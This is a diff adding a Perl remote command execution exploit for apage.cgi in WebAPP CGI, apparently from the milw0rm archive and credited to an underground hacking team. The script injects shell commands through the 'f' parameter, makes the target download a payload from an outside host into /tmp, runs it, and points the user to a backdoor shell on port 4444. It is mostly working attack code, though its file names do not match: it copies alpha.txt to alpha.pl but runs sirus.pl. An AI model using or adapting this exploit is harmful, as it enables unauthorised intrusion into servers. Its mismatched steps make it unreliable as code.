@@ -1,0 +1,69 @@
+!/usr/bin/perl
+#################################################################
+#                         T r a p - S e t   U n d e r G r o u n D   H a c k i n g   T e a m                               #
+#################################################################
+# Remote C0mmand Executing Expl0it - For WebAPP CGI
+#
+#Exploit By :  A l p h a _ P r o g r a m m e r ( Sirus-v );
+#E-Mail : Alpha_Programmer@Yahoo.com
+#            Trapset_Sec@Yahoo.Ca
+#This xpl Open a Backdoor in 4444 Port with Nobody Access !!! All Of The *NIX OS that Have UnPatch
+#apage.cgi is Vulnerable in this M0ment !!
+#
+#################################################################
+#  Gr33tz To ==>  AlphaST.Com , Crouz.Com  , Simorgh-ev.Com  And  MH_P0rtal , Oil_Krachack     #
+#################################################################
+use IO::Socket;
+
+if (@ARGV < 2)
+{
+ print "\n==============================================\n";
+ print " \n    WebAPP CGI Exploit By Alpha_Programmer \n\n";
+ print "      Trap-Set Underground Hacking Team      \n\n";
+ print "            Usage: <T4rg3t> <Dir>      \n\n";
+ print "==============================================\n\n";
+ print "Examples:\n\n";
+ print "    WebApp.pl www.Host.com /cgi-bin/ \n";
+ exit();
+}
+
+
+$serv = $ARGV[0];
+$serv =~ s/http:\/\///ge;
+
+$dir = $ARGV[1];
+
+$cmde = "cd /tmp;wget http://www.khatotarh.com/NeT/alpha.txt";
+
+$cmde =~ s/ /"\$IFS"/ge;
+
+$req  = "GET http://$serv";
+$req .= "$dir";
+$req .= "apage.cgi?f=file.htm.|echo\$IFS\"_N_\";$cmde;echo\$IFS\"_T_\"| HTTP/1.0\n\n";
+
+$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>80) or die " (-) - C4n't C0nn3ct To The S3rver\n";
+
+print $sock $req;
+print "\nPlease Wait ...\n\n";
+sleep(3000);
+close($sock);
+
+$sock2 = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>80) or die " (-) - C4n't C0nn3ct To The S3rver\n";
+
+
+$cmde2 = "cd /tmp;cp alpha.txt alpha.pl;chmod 777 sirus.pl;perl sirus.pl";
+
+$cmde2 =~ s/ /"\$IFS"/ge;
+
+$req2  = "GET http://$serv";
+$req2 .= "$dir";
+$req2 .= "apage.cgi?f=file.htm.|echo\$IFS\"_N_\";$cmde2;echo\$IFS\"_T_\"| HTTP/1.0\n\n";
+
+print $sock2 $req2;
+print "\n\n$$$   OK -- Now Try: Nc -v www.host.com 4444   $$$\n";
+print "$$  if This Port was Close , This mean is That , You Hav'nt Permission to Write in /TMP  $$\n";
+
+### EOF ###
+
+
+# milw0rm.com [2005-05-20]
